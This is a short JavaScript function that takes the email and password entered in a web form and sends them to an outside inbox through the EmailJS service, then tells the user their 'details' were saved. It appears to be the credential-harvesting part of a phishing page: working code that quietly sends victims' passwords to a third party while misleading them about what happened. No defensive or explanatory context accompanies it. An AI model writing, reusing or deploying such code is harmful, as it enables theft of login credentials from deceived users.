function sendMail() {
    let params = {
        email: document.getElementById("email").value,
        password: document.getElementById("password").value,
    };

    emailjs.send("service_rmcg0aw", "template_5bv3i4d", params)
        .then(function(response) {
            alert("Details saved Successfully!!!");
            console.log("Email sent successfully:", response);
        }, function(error) {
            console.error("Email sending failed:", error);
            alert("Failed to save details. Please try again.");
        });
}
